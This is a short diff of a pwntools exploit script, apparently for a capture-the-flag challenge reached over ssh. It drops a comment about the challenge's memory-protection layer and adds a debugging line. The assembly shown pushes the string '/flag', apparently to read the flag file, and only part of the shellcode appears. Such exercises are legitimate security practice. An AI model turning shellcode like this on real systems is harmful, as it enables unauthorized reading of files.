@@ -7,10 +7,6 @@ context.timeout = 3000000
 
 # 1 Stackframe is 8 bytes (64bit)
 
-# That is the extra layer:
-# puts("Removing write permissions from first 4096 bytes of shellcode.\n");
-#    assert(mprotect(shellcode_mem, 4096, PROT_READ|PROT_EXEC) == 0);
-
 shellcode=f"""
 mov rax, 0x67616c662f
 push rax
@@ -29,6 +25,9 @@ shellcode=(asm(shellcode))
 
 
 print('1', disasm(shellcode))
+
+ELF.from_bytes(shellcode).debug().interactive()
+
 
 s = ssh(host="pwn")
 
